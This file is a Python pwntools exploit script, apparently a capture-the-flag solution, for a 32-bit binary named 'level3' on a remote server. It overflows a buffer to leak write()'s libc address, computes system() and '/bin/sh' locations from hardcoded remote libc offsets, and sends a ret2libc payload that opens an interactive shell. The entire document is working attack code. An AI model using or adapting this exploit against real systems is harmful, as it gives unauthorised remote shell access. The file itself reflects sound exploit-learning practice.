from pwn import *

elf = ELF('./level3')

libc = ELF("/lib/i386-linux-gnu/libc.so.6")

#sh = process('./level3')
sh = remote('111.198.29.45',32219)

plt_write = elf.symbols['write']
print 'plt_write= ' + hex(plt_write)
got_write = elf.got['write']
print 'got_write= ' + hex(got_write)
vuln_addr = 0x0804844b

sh.recvuntil("Input:\n")

payload1 = 'a' * 0x88 + 'bbbb' + p32(plt_write) + p32(vuln_addr) + p32(1) + p32(got_write) + p32(4)
print "\n sending payload1"
sh.sendline(payload1)

print "\nrecving write() addr"
write_addr = u32(sh.recv(4))
print 'write_addr= ' + hex(write_addr)


'''
此处是根据本地libc进行的计算，通过符号表与实际地址的偏移进行利用
'''
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
print 'system_addr= ' + hex(system_addr)
print system_addr
bin_sh = write_addr - (libc.symbols['write'] - libc.search('/bin/sh').next())
print 'bin_sh= ' + hex(bin_sh)


'''
此处是按照远端的libc版本进行的计算，要通过数据库查询偏移
'''
libc_addr  =write_addr - 0x0d43c0
system_addr = libc_addr + 0x03a940
bin_sh = libc_addr + 0x15902b

payload2 = 'a' * 0x88 + 'bbbb' + p32(system_addr) + p32(vuln_addr) + p32(bin_sh)

print '\nsending payload2'

sh.sendline(payload2)

sh.interactive()
